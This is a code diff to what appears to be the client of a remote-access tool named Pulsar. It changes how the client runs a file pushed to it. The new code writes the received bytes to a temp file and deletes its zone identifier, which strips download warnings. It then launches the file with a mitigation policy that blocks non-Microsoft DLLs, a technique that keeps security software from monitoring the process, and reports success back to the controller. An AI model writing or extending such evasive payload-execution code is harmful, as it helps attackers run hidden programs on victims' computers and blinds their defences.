@@ -16,6 +16,9 @@ using System.Management;
 using System.Net;
 using System.Reflection;
 using System.Threading;
+using static Pulsar.Client.Utilities.NativeMethods;
+using System.Runtime.InteropServices;
+using SIZE_T = System.UIntPtr;
 
 namespace Pulsar.Client.Messages
 {
@@ -345,6 +348,7 @@ namespace Pulsar.Client.Messages
             }).Start();
         }
 
+
         private void ExecuteViaTemporaryFile(byte[] fileBytes, string fileExtension)
         {
             try
@@ -352,14 +356,92 @@ namespace Pulsar.Client.Messages
                 string tempPath = FileHelper.GetTempFilePath(fileExtension ?? ".exe");
                 File.WriteAllBytes(tempPath, fileBytes);
                 FileHelper.DeleteZoneIdentifier(tempPath);
-                Process.Start(new ProcessStartInfo { UseShellExecute = true, FileName = tempPath });
-                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
-                SendStatus("Process executed via temporary file");
+
+                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+                // USE NATIVE METHODS VERSION STRICTLY
+                var si = new Utilities.NativeMethods.STARTUPINFOEX();
+                si.StartupInfo.cb = Marshal.SizeOf(typeof(Utilities.NativeMethods.STARTUPINFOEX));
+
+                // ---- ATTRIBUTE LIST ----
+                IntPtr attrSize = IntPtr.Zero;
+
+                // First call retrieves required bytes
+                Utilities.NativeMethods.InitializeProcThreadAttributeList(
+                    IntPtr.Zero, 1, 0, ref attrSize);
+
+                si.lpAttributeList = Marshal.AllocHGlobal(attrSize);
+
+                if (!Utilities.NativeMethods.InitializeProcThreadAttributeList(
+                    si.lpAttributeList, 1, 0, ref attrSize))
+                {
+                    throw new Exception("InitializeProcThreadAttributeList failed.");
+                }
+
+                try
+                {
+                    ulong policy =
+                        Utilities.NativeMethods.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+
+                    if (!Utilities.NativeMethods.UpdateProcThreadAttribute(
+                        si.lpAttributeList,
+                        0,
+                        (IntPtr)Utilities.NativeMethods.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                        ref policy,
+                        (IntPtr)sizeof(ulong),
+                        IntPtr.Zero,
+                        IntPtr.Zero))
+                    {
+                        throw new Exception("UpdateProcThreadAttribute failed.");
+                    }
+
+                    // ---- CREATE PROCESS ----
+                    bool ok = Utilities.NativeMethods.CreateProcess(
+                        null,
+                        tempPath,
+                        IntPtr.Zero,
+                        IntPtr.Zero,
+                        false,
+                        Utilities.NativeMethods.EXTENDED_STARTUPINFO_PRESENT,
+                        IntPtr.Zero,
+                        null,
+                        ref si,    // << FIXED — correct struct type
+                        out pi
+                    );
+
+                    if (ok)
+                    {
+                        Utilities.NativeMethods.CloseHandle(pi.hProcess);
+                        Utilities.NativeMethods.CloseHandle(pi.hThread);
+
+                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                        SendStatus("Process executed with mitigation policy.");
+                    }
+                    else
+                    {
+                        Process.Start(new ProcessStartInfo
+                        {
+                            FileName = tempPath,
+                            UseShellExecute = true
+                        });
+
+                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                        SendStatus("Executed via fallback Process.Start().");
+                    }
+                }
+                finally
+                {
+                    if (si.lpAttributeList != IntPtr.Zero)
+                    {
+                        Utilities.NativeMethods.DeleteProcThreadAttributeList(si.lpAttributeList);
+                        Marshal.FreeHGlobal(si.lpAttributeList);
+                    }
+                }
             }
             catch (Exception ex)
             {
                 _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
-                SendStatus($"Temporary file execution failed: {ex.Message}");
+                SendStatus("Temporary file execution failed: " + ex.Message);
             }
         }
 
